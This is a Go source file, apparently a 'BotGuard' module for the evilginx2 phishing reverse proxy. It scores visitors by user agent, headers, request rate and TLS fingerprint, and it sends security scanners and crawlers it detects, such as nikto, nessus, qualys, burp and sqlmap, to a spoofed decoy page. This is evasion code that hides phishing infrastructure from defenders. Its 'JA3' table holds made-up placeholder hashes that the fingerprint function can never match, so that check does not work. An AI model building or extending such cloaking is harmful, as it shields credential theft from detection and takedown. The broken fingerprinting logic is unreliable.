package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// BotDetectionSensitivity levels
const (
	SensitivityLow    = "low"
	SensitivityMedium = "medium"
	SensitivityHigh   = "high"
)

// BotScore thresholds for different sensitivity levels
const (
	BotScoreThresholdLow    = 70
	BotScoreThresholdMedium = 50
	BotScoreThresholdHigh   = 30
)

// Known bot fingerprints and patterns
var knownBotFingerprints = []string{
	// Common bot user agents (partial matches)
	"bot", "crawler", "spider", "scraper", "curl", "wget",
	"python-requests", "go-http-client", "java/", "ruby",
	"phantomjs", "headlesschrome", "selenium",
	// Security scanners
	"nikto", "nmap", "masscan", "nessus", "qualys",
	"acunetix", "burp", "zap", "sqlmap",
}

// TLS fingerprints of known bots (JA3 hashes)
var knownBotJA3Hashes = map[string]string{
	// Common bot JA3 fingerprints
	"3b8d1ed0f1e3e3f3f3f3f3f3f3f3f3f3": "Generic Python requests",
	"4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d": "Curl default",
	"5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a": "Golang default HTTP client",
}

// BotGuard provides bot detection and mitigation
type BotGuard struct {
	cfg             *Config
	sensitivity     string
	spoofURL        string
	requestTracker  map[string]*requestPattern
	tlsFingerprints map[string]string
	mu              sync.RWMutex
}

// requestPattern tracks behavioral patterns for bot detection
type requestPattern struct {
	IP              string
	UserAgent       string
	RequestCount    int
	LastRequest     time.Time
	RequestTimes    []time.Time
	UniqueURIs      map[string]bool
	TLSFingerprint  string
	BotScore        int
	IsBot           bool
}

// NewBotGuard creates a new BotGuard instance
func NewBotGuard(cfg *Config) *BotGuard {
	bg := &BotGuard{
		cfg:             cfg,
		sensitivity:     SensitivityMedium,
		requestTracker:  make(map[string]*requestPattern),
		tlsFingerprints: make(map[string]string),
	}

	// Start cleanup routine
	go bg.cleanupRoutine()

	return bg
}

// SetSensitivity sets the bot detection sensitivity
func (bg *BotGuard) SetSensitivity(sensitivity string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	switch sensitivity {
	case SensitivityLow, SensitivityMedium, SensitivityHigh:
		bg.sensitivity = sensitivity
		log.Info("BotGuard sensitivity set to: %s", sensitivity)
	default:
		log.Warning("Invalid sensitivity level: %s, defaulting to medium", sensitivity)
		bg.sensitivity = SensitivityMedium
	}
}

// SetSpoofURL sets the URL to display to detected bots
func (bg *BotGuard) SetSpoofURL(url string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.spoofURL = url
}

// AnalyzeRequest analyzes an incoming request for bot patterns
func (bg *BotGuard) AnalyzeRequest(req *http.Request, tlsState *tls.ConnectionState) (*requestPattern, bool) {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	clientID := bg.getClientID(req)
	pattern, exists := bg.requestTracker[clientID]

	if !exists {
		pattern = &requestPattern{
			IP:           bg.getClientIP(req),
			UserAgent:    req.UserAgent(),
			RequestCount: 0,
			UniqueURIs:   make(map[string]bool),
			RequestTimes: make([]time.Time, 0),
		}
		bg.requestTracker[clientID] = pattern
	}

	// Update request pattern
	now := time.Now()
	pattern.RequestCount++
	pattern.LastRequest = now
	pattern.RequestTimes = append(pattern.RequestTimes, now)
	pattern.UniqueURIs[req.URL.Path] = true

	// Extract TLS fingerprint if available
	if tlsState != nil {
		pattern.TLSFingerprint = bg.extractJA3Fingerprint(tlsState)
	}

	// Calculate bot score
	pattern.BotScore = bg.calculateBotScore(pattern, req)

	// Determine if it's a bot based on sensitivity
	threshold := bg.getScoreThreshold()
	pattern.IsBot = pattern.BotScore >= threshold

	if pattern.IsBot {
		log.Warning("[BotGuard] Bot detected - IP: %s, UA: %s, Score: %d/%d",
			pattern.IP, pattern.UserAgent, pattern.BotScore, threshold)
	}

	return pattern, pattern.IsBot
}

// calculateBotScore calculates a bot likelihood score (0-100)
func (bg *BotGuard) calculateBotScore(pattern *requestPattern, req *http.Request) int {
	score := 0

	// Check user agent patterns (30 points)
	ua := strings.ToLower(pattern.UserAgent)
	for _, botUA := range knownBotFingerprints {
		if strings.Contains(ua, botUA) {
			score += 30
			break
		}
	}

	// Check for missing or suspicious headers (20 points)
	if req.Header.Get("Accept-Language") == "" {
		score += 10
	}
	if req.Header.Get("Accept-Encoding") == "" {
		score += 10
	}

	// Check request rate (20 points)
	if pattern.RequestCount > 10 {
		// Calculate requests per minute
		if len(pattern.RequestTimes) >= 10 {
			duration := time.Since(pattern.RequestTimes[len(pattern.RequestTimes)-10])
			requestsPerMinute := float64(10) / duration.Minutes()
			if requestsPerMinute > 30 {
				score += 20
			} else if requestsPerMinute > 20 {
				score += 10
			}
		}
	}

	// Check TLS fingerprint (20 points)
	if pattern.TLSFingerprint != "" {
		if _, isKnownBot := knownBotJA3Hashes[pattern.TLSFingerprint]; isKnownBot {
			score += 20
		}
	}

	// Check behavior patterns (10 points)
	if pattern.RequestCount > 5 && len(pattern.UniqueURIs) == 1 {
		// Many requests to same URI
		score += 10
	}

	// Cap score at 100
	if score > 100 {
		score = 100
	}

	return score
}

// getScoreThreshold returns the bot score threshold based on sensitivity
func (bg *BotGuard) getScoreThreshold() int {
	switch bg.sensitivity {
	case SensitivityLow:
		return BotScoreThresholdLow
	case SensitivityHigh:
		return BotScoreThresholdHigh
	default:
		return BotScoreThresholdMedium
	}
}

// extractJA3Fingerprint extracts a JA3-like fingerprint from TLS connection
func (bg *BotGuard) extractJA3Fingerprint(tlsState *tls.ConnectionState) string {
	// Simplified JA3 fingerprinting
	// In a real implementation, this would compute the full JA3 hash
	// For now, we'll create a simple fingerprint based on TLS version and cipher suite

	if tlsState == nil {
		return ""
	}

	// Create a simple fingerprint
	fingerprint := fmt.Sprintf("%d-%x-%d",
		tlsState.Version,
		tlsState.CipherSuite,
		len(tlsState.PeerCertificates))

	return fingerprint
}

// getClientID generates a unique client identifier
func (bg *BotGuard) getClientID(req *http.Request) string {
	ip := bg.getClientIP(req)
	ua := req.UserAgent()
	return fmt.Sprintf("%s|%s", ip, ua)
}

// getClientIP extracts the client IP address from the request
func (bg *BotGuard) getClientIP(req *http.Request) string {
	// Check for proxy headers
	if ip := req.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	if ip := req.Header.Get("X-Forwarded-For"); ip != "" {
		// Take the first IP in the chain
		parts := strings.Split(ip, ",")
		return strings.TrimSpace(parts[0])
	}

	// Fall back to remote address
	ip := req.RemoteAddr
	// Remove port if present
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

// ShouldBlock determines if a request should be blocked
func (bg *BotGuard) ShouldBlock(pattern *requestPattern) bool {
	return pattern != nil && pattern.IsBot
}

// GetSpoofResponse returns a response for detected bots
func (bg *BotGuard) GetSpoofResponse(req *http.Request) *http.Response {
	bg.mu.RLock()
	spoofURL := bg.spoofURL
	bg.mu.RUnlock()

	if spoofURL == "" {
		// Return a simple 403 if no spoof URL is configured
		return &http.Response{
			StatusCode: http.StatusForbidden,
			Body:       nil,
			Header:     make(http.Header),
		}
	}

	// Fetch content from the spoof URL
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Allow up to 3 redirects
			if len(via) >= 3 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}

	// Create a new request to the spoof URL
	spoofReq, err := http.NewRequest("GET", spoofURL, nil)
	if err != nil {
		log.Error("[botguard] failed to create spoof request: %v", err)
		return &http.Response{
			StatusCode: http.StatusInternalServerError,
			Body:       nil,
			Header:     make(http.Header),
		}
	}

	// Copy some headers from the original request for realism
	spoofReq.Header.Set("User-Agent", req.UserAgent())
	spoofReq.Header.Set("Accept", req.Header.Get("Accept"))
	spoofReq.Header.Set("Accept-Language", req.Header.Get("Accept-Language"))

	// Fetch the content
	resp, err := client.Do(spoofReq)
	if err != nil {
		log.Error("[botguard] failed to fetch spoof content: %v", err)
		// Return a redirect as fallback
		fallbackResp := &http.Response{
			StatusCode: http.StatusFound,
			Header:     make(http.Header),
		}
		fallbackResp.Header.Set("Location", spoofURL)
		return fallbackResp
	}

	// Return the fetched content
	return resp
}

// cleanupRoutine periodically cleans up old tracking data
func (bg *BotGuard) cleanupRoutine() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		bg.mu.Lock()
		now := time.Now()
		
		// Remove patterns older than 30 minutes
		for clientID, pattern := range bg.requestTracker {
			if now.Sub(pattern.LastRequest) > 30*time.Minute {
				delete(bg.requestTracker, clientID)
			}
		}
		
		// Trim old request times
		for _, pattern := range bg.requestTracker {
			if len(pattern.RequestTimes) > 100 {
				// Keep only the last 100 request times
				pattern.RequestTimes = pattern.RequestTimes[len(pattern.RequestTimes)-100:]
			}
		}
		
		bg.mu.Unlock()
	}
}

// GetStats returns current botguard statistics
func (bg *BotGuard) GetStats() map[string]interface{} {
	bg.mu.RLock()
	defer bg.mu.RUnlock()

	totalPatterns := len(bg.requestTracker)
	botCount := 0
	
	for _, pattern := range bg.requestTracker {
		if pattern.IsBot {
			botCount++
		}
	}

	return map[string]interface{}{
		"total_tracked":    totalPatterns,
		"bots_detected":    botCount,
		"sensitivity":      bg.sensitivity,
		"has_spoof_url":    bg.spoofURL != "",
	}
}
